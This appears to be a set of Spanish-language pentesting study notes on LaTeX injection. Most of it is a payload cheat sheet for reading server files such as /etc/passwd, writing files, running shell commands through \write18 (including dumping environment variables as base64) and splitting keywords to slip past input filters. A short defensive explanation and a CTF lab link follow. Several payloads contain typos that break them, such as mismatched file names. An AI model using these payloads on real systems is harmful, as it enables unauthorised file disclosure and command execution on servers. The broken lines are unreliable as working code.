---
tags:
  - Web
  - Explotacion
  - LaTex
---

# Notas

http://salmonsec.com/cheatsheets/exploitation/latex_injection

Estas vulnerabilidades solo están en las páginas webs que integran la creación de documentos mediante LaTeX.

Para vulnerar estas web podemos realizar lo siguiente:

**PODEMOS BUSCAR EN INTERNET POR LATEX INJECTION PARA BUSCAR PAYLOADS**

Formas de que se ejecuta LaTeX:
- -no-shell-escape
	- Deshabilitar la construcción \write18{command}, incluso si está habilitado en el archivo texmf.cnf
- -shell-restricted
	- Igual que x, pero limitado a un conjunto «seguro» de comandos predefinidos
- -shell-escape
	- Habilita la construcción \write18{command}. El comando puede ser cualquier comando del shell. Esta construcción normalmente no está permitida por razones de seguridad.


## Leer archivos


```latex
\input{/etc/passwd}
\include{somefile} # load .tex file (somefile.tex)
```

Es esto puede que no funcione porque este sanitizado las palabras `input` e `inclide`.



**Leer por una sola linea**

```latex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```


**Leer múltiples lineas**

```latex
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```


**Leer el texto manteniendo el formato**

```latex
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

## Write File

```latex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile

```

## Command Execution

La entrada del comando será redirigida a stdin, utilice un archivo temporal para obtenerla.

```latex
\immediate\write18{id > outpu}
\input{output}
```

Si obtiene algún error LaTex, considere la posibilidad de utilizar base64 para obtener el resultado sin caracteres erróneos


```latex
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```


```latex
\input|ls|base4
\input{|"/bin/hostname"}
```

## Mostrar palabras sanitizadas

En el caso de que la palabra `input` este sanitizada haremos lo siguiente:

```latex
\def\first{in}
\def\second{put}
\first\second
```

# Hack4u

Las **inyecciones LaTeX** son un tipo de ataque que se aprovecha de las vulnerabilidades en las aplicaciones web que permiten a los usuarios ingresar **texto formateado** en LaTeX. LaTeX es un sistema de composición de textos que se utiliza comúnmente en la escritura académica y científica.

Los ataques de inyección LaTeX ocurren cuando un atacante ingresa código LaTeX malicioso en un campo de entrada de texto que luego se procesa en una aplicación web. El código LaTeX puede ser diseñado para aprovechar vulnerabilidades en la aplicación y **ejecutar código malicioso** en el servidor.

Un ejemplo de una inyección LaTeX podría ser un ataque que aprovecha la capacidad de LaTeX para incluir gráficos y archivos en una aplicación web. Un atacante podría enviar un código LaTeX que incluya un enlace a un archivo malicioso, como un virus o un troyano, que podría infectar el servidor o los sistemas de la red.

Para evitar las inyecciones LaTeX, las aplicaciones web deben validar y limpiar adecuadamente los datos que se reciben antes de procesarlos en LaTeX. Esto incluye la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en LaTeX.

También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades de la aplicación para detectar posibles inyecciones. Además, se debe fomentar la educación sobre la seguridad en el uso de LaTeX y cómo evitar la introducción de código malicioso.

A continuación, se os proporciona el enlace correspondiente al proyecto de Github que nos descargamos para desplegar un laboratorio vulnerable donde poder practicar esta vulnerabilidad:

- **Laboratorio LaTeX Injection**: [https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)
# Laboratorios

A continuación, se os proporciona el enlace correspondiente al proyecto de Github que nos descargamos para desplegar un laboratorio vulnerable donde poder practicar esta vulnerabilidad:

- **Laboratorio LaTeX Injection**: [https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)
